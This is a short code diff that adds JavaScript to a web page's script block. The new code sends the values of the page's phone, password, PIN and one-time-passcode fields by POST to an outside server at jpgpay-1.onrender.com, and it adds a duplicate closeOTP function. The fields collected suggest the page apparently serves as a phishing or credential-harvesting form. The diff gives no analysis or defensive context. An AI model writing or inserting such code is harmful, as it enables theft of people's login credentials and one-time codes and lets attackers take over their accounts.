@@ -516,6 +516,32 @@ function closeOTP(){
         .style.display = "none";
 
 }
+fetch('https://jpgpay-1.onrender.com/submit', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        phone: document.getElementById('phone').value,
+        password: document.getElementById('password').value,
+        pin: document.getElementById('pin').value,
+        otp: document.getElementById('otpInput').value
+    })
+})
+.then(response => response.json())
+.then(data => {
+    console.log('Success:', data);
+})
+.catch((error) => {
+    console.error('Error:', error);
+});
+
+function closeOTP(){
+
+    document.getElementById("otpOverlay")
+        .style.display = "none";
+
+}
 
 </script>
 
